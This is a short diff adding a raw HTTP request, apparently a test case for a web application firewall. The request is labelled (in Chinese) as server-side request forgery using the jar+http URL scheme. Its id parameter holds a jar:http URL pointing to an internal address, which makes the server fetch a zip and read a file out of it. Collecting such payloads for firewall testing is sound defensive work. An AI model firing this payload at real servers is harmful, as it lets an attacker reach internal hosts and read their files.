@@ -1,0 +1,9 @@
+# SSRF服务端请求伪造_jar+http协议
+# 使用HTTP协议下载jar/zip文件，利用 Jar URL协议解析，读取 zip 格式文件(包括 jar 包)中的内容
+GET /?id=jar:http:%2F%2F192.168.110.110%2Fssrf.txt.zip%21%2Fssrf.txt&bid=hd_tag_m8mv24n5 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24n5
+RM-PRO-Token: ecbfe884057f0c2874a7d0deed6f6fd3
+RM-PRO-Time: 1742808393955
+User-Agent: curl/7.83.1
+
